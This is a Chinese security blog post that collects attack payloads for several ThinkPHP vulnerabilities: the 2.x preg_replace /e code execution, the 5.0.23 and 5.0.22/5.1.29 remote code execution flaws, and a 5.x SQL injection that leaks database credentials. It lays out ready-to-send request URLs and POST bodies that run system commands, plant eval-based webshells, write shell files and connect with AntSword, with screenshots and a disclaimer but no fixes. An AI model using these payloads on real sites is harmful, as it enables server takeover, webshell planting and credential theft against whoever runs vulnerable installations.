#  【攻防实战】ThinkPHP-RCE集锦   
原创 儒道易行  儒道易行   2025-05-30 12:00  
  
**善恶终有报，天道好轮回；不信抬头看，苍天饶过谁**  
# ThinkPHP 2.x RCE漏洞  
## 0、漏洞描述  
  
ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：  
```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```  
  
导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。  
  
ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。  
## 1、查询phpinfo()  
```
/index.php?s=/index/index/xxx/${phpinfo()}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uVhKnxv1LBdVdg5uicp8iaH4JY2471c6GjBibttoSB3jquZI9vTeM2ar0g/640?wx_fmt=png&from=appmsg "")  
## 2、任意代码执行  
```
index.php?s=/index/index/xxx/${system(whoami)}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3u0vv0iaoibtmSqsLrGzYE2O2kto42OCKNwSu5Xic1sNejsKvu5vnZxZwyg/640?wx_fmt=png&from=appmsg "")  
## 3、Getshell  
```
/index.php/module/action/param1/$%7B@print(eval($_POST['1']))%7D
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3u89tzaictRTF6BtvpjGfp90XjZ4qvswqAYNKM7qGeb8MudP3wAhibkxsg/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uibbrqOOUibKdYEuax1NsJ9q8D4dmhicT9oBwWUeOjAnzCTtka6jjlGI5Q/640?wx_fmt=png&from=appmsg "")  
# ThinkPHP5 5.0.23 RCE漏洞  
## 0、漏洞描述  
  
ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。  
## 1、成功执行id命令  
  
发送数据包：  
```
POST /index.php?s=captcha HTTP/1.1
```  
```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uVSWJbDFEgmIQZNQYSq7T5PC96K4NdMibCZ5z2GibEzamZGoTkjFsiacTQ/640?wx_fmt=png&from=appmsg "")  
## 2、工具验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uPDMTqiajbpCa0Q2I03IgcSSLkpicIiazfNHmjjNibCwcibicCxrFRlxFqrlw/640?wx_fmt=png&from=appmsg "")  
# ThinkPHP5 SQL注入漏洞 && 敏感信息泄露  
## 0、漏洞原理  
  
漏洞原理说明：  
  
传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。  
## 1、SQL注入  
  
信息成功被爆出：  
```
/index.php?ids[0,updatexml(0,concat(0xa,user0),0)]=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3usdOAYrYUGNGHicA45cu6fIw5eBGG2GrbzeK5zHia2uCgHDKU4jsSiaWxA/640?wx_fmt=png&from=appmsg "")  
## 2、敏感信息泄露  
  
通过DEBUG页面，找到了数据库的账号、密码：  
```
/index.php?ids[0,updatexml(0,concat(0xa,user0),0)]=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3ufpVfFhW3jGvVUK3qTicbklUcvFoyD3Onk2T9r0P2WdzNpykSDB00Urw/640?wx_fmt=png&from=appmsg "")  
  
这属于一个敏感信息泄露漏洞。  
## 3、工具验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uSgv8ORX3eZa4JpVe2GyUl1IKBP4foXbnTgA8sfWtNKLY1QwiaDareZw/640?wx_fmt=png&from=appmsg "")  
# Thinkphp 5 5.0.22&5.1.29 RCE漏洞  
## 0、漏洞概述  
  
ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。  
## 1、执行phpinfo  
```
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uHnd3mOW8bp4QSKoDg1TSVM2mbaFvQZFnqriaVFZCp1s19zOhvewVrKw/640?wx_fmt=png&from=appmsg "")  
## 2、尝试执行系统命令  
```
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uZXfbKLt71iayicyTRE8e3tCDbWakLqUZNicyxXa6nhsX51MoWuMmOUib6g/640?wx_fmt=png&from=appmsg "")  
## 3、写入shell文件  
```
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=......
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uLKCYlq3BwEWSO9Tib1ricJQuyOBhb3Shq8TQ7qgJZtYXEMYyCp6lNVjw/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3u8nozALyXVOLEOU7lPBw6uruxUQ9zEzuZL4FZelg3baQKqElztXRrYw/640?wx_fmt=png&from=appmsg "")  
  
工具验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uuu8QvdnuRicqekibQTkVMeOBicQtX3YNqvKSGwCib3zDDRxQFvXTomkiaCw/640?wx_fmt=png&from=appmsg "")  
# 攻防交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxLHzNd5jrnkMt72vibWYX3uFrwOticvtLl3D5aPiapZ1mDaqksq1ypJ1wAlnkBiakJ05MfMRUtMCY32A/640?wx_fmt=jpeg&from=appmsg "")  
# 声明  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
